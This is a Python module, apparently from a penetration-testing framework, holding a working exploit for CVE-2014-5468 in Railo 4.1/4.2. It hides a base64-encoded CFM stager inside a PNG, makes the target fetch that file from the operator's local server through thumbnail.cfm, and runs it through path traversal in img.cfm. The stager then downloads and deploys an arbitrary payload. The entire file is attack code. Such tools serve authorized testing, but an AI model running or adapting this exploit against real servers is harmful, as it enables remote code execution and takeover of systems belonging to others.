from src.platform.railo.interfaces import RINTERFACES
from src.module.deploy_utils import _serve, waitServe, parse_war_path, killServe
from hashlib import md5
from commands import getoutput
from shutil import copyfile
from threading import Thread
from base64 import b64encode
from os.path import abspath
from requests import get
from time import sleep
from log import LOG
from random import randint
import utility
import state


title = RINTERFACES.DSR
versions = ['4.1', '4.2']
def deploy(fingerengine, fingerprint):
    """ 
    Exploits CVE-2014-5468

    Details in blogspot, but tl;dr:
        a) Invoke thumbnail.cfm with a valid PNG image that has our CFM stager
        embedded into it.  The extension of the file must also be a .CFM, and
        the height/width must be larger values to prevent Railo from
        modifying and removing the payload.

        b) Invoke img.cfm with thistag.executionmode=start and attributes.src
        set to the previously written file, which will be HASH.cfm.

        c) catch stager request and serve up payload.
    """

    cfm_path = abspath(fingerengine.options.deploy)
    cfm_file = parse_war_path(cfm_path, True)
    dip = fingerengine.options.ip
    os = fingerengine.options.remote_os

    utility.Msg("Preparing to deploy {0}...".format(cfm_file))

    base = "http://{0}:{1}".format(dip, fingerprint.port)

    #
    # first we pull down our modified png as a cfm with the embedded stager
    #
    tn = "/railo-context/admin/thumbnail.cfm?img={0}&height=5000&width=5000"
    pl_file = load_file(base + tn, cfm_file, os, fingerprint.version)
    if not pl_file: 
        return
    
    #
    # once the stager is uploaded, we invoke img.cfm to pull the file and execute
    #
    jsl = "/railo-context/admin/img.cfm?attributes.src=../../../../temp/admin-"\
          "ext-thumbnails/{0}&thistag.executionmode=start"
    if not invoke(base + jsl, cfm_path, os, fingerprint.version, pl_file):
        return


def invoke(url, payload, os, version, pl_file):
    """ All we need to do is traverse up to the admin-ext-thumbnails
    directory and invoke our stager
    """

    utility.Msg("Invoking stager and deploying payload...")
    fetchurl = "http://{0}:{1}/{2}".format(utility.local_address(), 
                                           state.external_port, pl_file)

    # calculate file hash 
    hsh = md5("%s-5000-5000" % fetchurl).hexdigest().upper() 
    url = url.format(hsh)

    # fire up server
    server_thread = Thread(target=_serve, args=(payload,))
    server_thread.start()
    sleep(2)

    r = utility.requests_get(url)
    if waitServe(server_thread):
        utility.Msg("{0} deployed at /railo-context/{0}".format(
                                            parse_war_path(payload,True)),
                                                        LOG.SUCCESS)
    else:
        utility.Msg("Failed to deploy (HTTP %d)" % r.status_code, LOG.ERROR)

        killServe()


def load_file(url, payload_file, os, version):
    """ Make a copy of our test PNG file, embed the stager into it,
    change the extension, and stash it on the server
    """

    pl_file = "msh%d.cfm" % randint(0, 500)
    fetchurl = "http://{0}:{1}/{2}".format(utility.local_address(), 
                                           state.external_port, payload_file)
    b64 = b64encode(fetchurl)
    
    stager = "<cfhttp method='get' url='#ToString(ToBinary('{0}'))#'"\
             " path='#GetDirectoryFromPath(GetCurrentTemplatePath())#..\..\context\'"\
             " file='{1}'>".format(b64, payload_file)
    
    # set our stager
    copyfile("./src/lib/railo/header.png", "{0}/{1}".format(state.serve_dir, pl_file))
    with open("{0}/{1}".format(state.serve_dir, pl_file), "ab") as f:
        f.write(stager + '\x00')

    # fire up server
    server_thread = Thread(target=_serve, args=("%s/%s" % (state.serve_dir, pl_file),))
    server_thread.start()
    sleep(2)

    # invoke
    _ = utility.requests_get(url.format('http://{0}:{1}/{2}'.format(
                                   utility.local_address(), state.external_port,
                                   pl_file)))
    if waitServe(server_thread):
        utility.Msg("%s stashed on remote host, preparing to invoke..." % pl_file, LOG.DEBUG)
    else:
        utility.Msg("Failed to invoke server call", LOG.ERROR)
        pl_file = None

    killServe()
    return pl_file
